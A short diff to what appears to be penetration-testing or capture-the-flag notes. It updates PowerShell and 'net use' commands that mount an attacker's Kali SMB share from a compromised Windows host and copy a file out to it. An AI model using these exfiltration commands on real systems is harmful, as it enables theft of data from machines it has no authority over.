@@ -57,7 +57,11 @@ now on the windows powershell,
 ```
 $pass = convertto-securestring 'guest' -asplaintext -force
 $cred = new-object system.management.automation.pscredential('guest', $pass)
-new-psdrive -name kalidrive -psprovider filesystem -credential $cred -root \\10.10.14.22\kalishare
+new-psdrive -name kalidrive -psprovider filesystem -credential $cred -root \\10.10.14.77\kalishare
+```
+```alternate to above
+net use x: \\10.10.14.77\kalishare /user:guest guest
+cmd /c "copy <sourcefile> X:\"
 ```
 
 #### Powerview
